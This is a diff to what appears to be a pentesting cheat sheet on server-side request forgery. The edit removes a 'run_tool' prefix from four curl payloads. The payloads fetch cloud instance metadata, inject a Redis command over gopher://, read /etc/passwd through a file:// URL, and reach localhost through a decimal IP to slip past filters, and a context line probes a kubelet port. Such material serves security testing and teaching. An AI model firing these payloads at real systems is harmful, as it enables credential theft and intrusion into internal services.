@@ -157,14 +157,14 @@ curl -s http://127.0.0.1:10255/pods
 
 ```bash
 # Basic SSRF test to metadata
-run_tool curl "http://target.example/fetch?url=http://169.254.169.254/latest/meta-data/"
+curl "http://target.example/fetch?url=http://169.254.169.254/latest/meta-data/"
 
 # Gopher-based Redis command injection
-run_tool curl "gopher://127.0.0.1:6379/_SET%20pwned%20true"
+curl "gopher://127.0.0.1:6379/_SET%20pwned%20true"
 
 # File read via SSRF
-run_tool curl "http://target.example/fetch?url=file:///etc/passwd"
+curl "http://target.example/fetch?url=file:///etc/passwd"
 
 # Decimal IP bypass
-run_tool curl "http://target.example/fetch?url=http://2130706433/"
+curl "http://target.example/fetch?url=http://2130706433/"
 ```
